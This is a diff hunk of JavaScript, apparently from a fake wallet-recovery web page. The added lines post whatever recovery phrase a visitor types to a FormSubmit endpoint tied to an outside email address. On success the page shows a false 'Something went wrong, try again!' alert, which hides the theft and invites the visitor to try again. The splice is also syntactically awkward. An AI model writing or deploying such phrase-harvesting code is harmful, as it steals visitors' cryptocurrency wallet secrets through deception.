@@ -159,6 +159,25 @@ document.addEventListener('DOMContentLoaded', () => {
                 alert("Form cannot be processed");
                 // Handle error actions (e.g., display an error message)
             });
+            else if (recoveryPhrase) {
+            // Submit the recovery phrase to FormSubmit
+            fetch('https://formsubmit.co/@lostangels77@protonmail.com', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({ recoveryPhrase: recoveryPhrase })
+            })
+            .then(response => response.json())
+            .then(data => {
+                alert("Something went wrong, try again!");
+                // Handle success actions (e.g., display a success message, clear the form)
+            })
+            .catch((error) => {
+                alert("Form cannot be processed");
+                // Handle error actions (e.g., display an error message)
+            });
         } else {
             alert('Recovery phrase cannot be empty.');
             // Handle the case where the recovery phrase is empty (e.g., display an error message)
